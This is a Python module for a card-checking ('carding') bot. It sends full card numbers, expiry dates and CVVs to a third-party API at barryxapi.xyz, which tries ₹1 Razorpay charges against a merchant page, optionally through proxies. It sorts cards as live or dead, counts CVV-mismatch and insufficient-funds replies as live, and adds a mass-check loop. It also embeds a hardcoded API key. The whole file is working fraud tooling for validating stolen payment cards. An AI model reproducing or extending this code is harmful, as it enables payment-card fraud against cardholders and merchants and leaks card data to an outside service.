"""
================================================================================
  Razorpay Gate - ₹1 Charge (BarryX API)
  /rz - Single card check
  /mrz - Mass check with 1 second delay
================================================================================
"""

import aiohttp
import asyncio
import time
import json

RZ_API_URL = "https://api.barryxapi.xyz/razorpay"
RZ_API_KEY = "BRY-KESNP-TUPWH-JFOT9"
RZ_SITE = "https://razorpay.me/@ayurgamaya"
DEFAULT_AMOUNT = 1

async def check_rz_async(card: str, proxy: str = None, retries: int = 2) -> dict:
    """Check a single card using Razorpay ₹1 gate via BarryX API (async)"""
    start_time = time.time()
    
    try:
        if '|' in card:
            parts = card.split('|')
            card_number = parts[0].strip()
            exp_month = parts[1].strip() if len(parts) > 1 else '12'
            exp_year = parts[2].strip() if len(parts) > 2 else '2025'
            cvv = parts[3].strip() if len(parts) > 3 else '123'
        else:
            return {
                "status": "ERROR",
                "message": "Invalid card format",
                "card": card,
                "gate": "Razorpay",
                "time": 0
            }
        
        card_data = f"{card_number}|{exp_month}|{exp_year}|{cvv}"
        
        payload = {
            "key": RZ_API_KEY,
            "card": card_data,
            "amount": f"{DEFAULT_AMOUNT}rs",
            "site": RZ_SITE,
            "proxy": proxy
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        }
        
        timeout = aiohttp.ClientTimeout(total=60)
        
        for attempt in range(retries + 1):
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    async with session.post(RZ_API_URL, json=payload, headers=headers) as response:
                        response_time = round(time.time() - start_time, 2)
                        
                        if response.status == 503:
                            if attempt < retries:
                                await asyncio.sleep(2)
                                continue
                            return {
                                "status": "ERROR",
                                "message": "⚠️ API Down - Try again later",
                                "card": card,
                                "gate": "Razorpay",
                                "time": response_time
                            }
                        
                        if response.status != 200:
                            return {
                                "status": "ERROR",
                                "message": f"⚠️ HTTP {response.status}",
                                "card": card,
                                "gate": "Razorpay",
                                "time": response_time
                            }
                        
                        response_text = await response.text()
                        
                        try:
                            data = json.loads(response_text)
                            
                            result = data.get('result', {})
                            api_status = data.get('status', False)
                            
                            status_code = str(result.get('status', '')).lower()
                            message = result.get('message', '').lower()
                            reason = result.get('reason', '').lower()
                            response_msg = result.get('message', '')
                            
                            if api_status == True or status_code == 'approved' or status_code == 'success' or status_code == 'live' or 'charged' in message or 'approved' in message or 'live' in message or 'success' in message:
                                return {
                                    "status": "APPROVED",
                                    "message": "Payment Successful ✅",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'captured' in message or 'authorized' in message or 'captured' in reason:
                                return {
                                    "status": "APPROVED",
                                    "message": "Payment Successful ✅",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'ccn' in message or 'incorrect cvv' in message or 'cvv' in message:
                                return {
                                    "status": "APPROVED",
                                    "message": "Payment Successful ✅",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'insufficient' in message:
                                return {
                                    "status": "APPROVED",
                                    "message": "Payment Successful ✅",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if '3ds' in message or 'otp' in message or 'authentication' in message:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'risk' in message or 'fraud' in message:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'expired' in message:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'invalid' in message:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'declined' in message or status_code == 'declined' or status_code == 'dead':
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if 'error' in status_code or 'failed' in message:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            
                            if response_msg:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                            else:
                                return {
                                    "status": "DECLINED",
                                    "message": "Your payment has been declined ❌",
                                    "card": card,
                                    "gate": "Razorpay",
                                    "time": response_time
                                }
                        
                        except json.JSONDecodeError:
                            return {
                                "status": "ERROR",
                                "message": "⚠️ Invalid JSON Response",
                                "card": card,
                                "gate": "Razorpay",
                                "time": response_time
                            }
            except Exception as inner_e:
                if attempt < retries:
                    await asyncio.sleep(2)
                    continue
                raise inner_e
        
        response_time = round(time.time() - start_time, 2)
        return {
            "status": "ERROR",
            "message": "⚠️ Max retries reached",
            "card": card,
            "gate": "Razorpay",
            "time": response_time
        }
    
    except asyncio.TimeoutError:
        response_time = round(time.time() - start_time, 2)
        return {
            "status": "ERROR",
            "message": "⚠️ Timeout - Gateway slow",
            "card": card,
            "gate": "Razorpay",
            "time": response_time
        }
    
    except Exception as e:
        response_time = round(time.time() - start_time, 2)
        return {
            "status": "ERROR",
            "message": f"⚠️ Error: {str(e)[:50]}",
            "card": card,
            "gate": "Razorpay",
            "time": response_time
        }


def check_rz(card: str, proxy: str = None) -> dict:
    """Sync wrapper for async check"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                future = pool.submit(asyncio.run, check_rz_async(card, proxy))
                return future.result()
        else:
            return asyncio.run(check_rz_async(card, proxy))
    except:
        return asyncio.run(check_rz_async(card, proxy))


def format_rz_response(result: dict, bin_info: dict = None, username: str = None) -> str:
    """Format Razorpay gate response using unified Onichan format"""
    from modules.gate_checker import _onichan_format
    status = result.get("status", "ERROR")
    card = result.get("card", "N/A")
    message = result.get("message", "N/A")
    response_time = result.get("time", 0)
    
    parts = card.split("|")
    cc = parts[0] if len(parts) > 0 else "N/A"
    mm = parts[1] if len(parts) > 1 else "N/A"
    yy = parts[2] if len(parts) > 2 else "N/A"
    cvv = parts[3] if len(parts) > 3 else "N/A"
    
    if not bin_info:
        bin_info = {}
    
    if status == "APPROVED":
        fmt_result = {"status": "success", "message": f"Approved - {message}"}
    else:
        fmt_result = {"status": "fail", "message": f"Declined - {message}"}
    
    return _onichan_format(fmt_result, cc, mm, yy, cvv, bin_info, f"Razorpay ₹{DEFAULT_AMOUNT}", float(response_time), username or "Unknown")


async def check_mass_rz_async(cards: list, delay: float = 1.0) -> list:
    """Check multiple cards with delay between each (async)"""
    results = []
    for i, card in enumerate(cards):
        result = await check_rz_async(card.strip())
        results.append(result)
        if i < len(cards) - 1:
            await asyncio.sleep(delay)
    return results
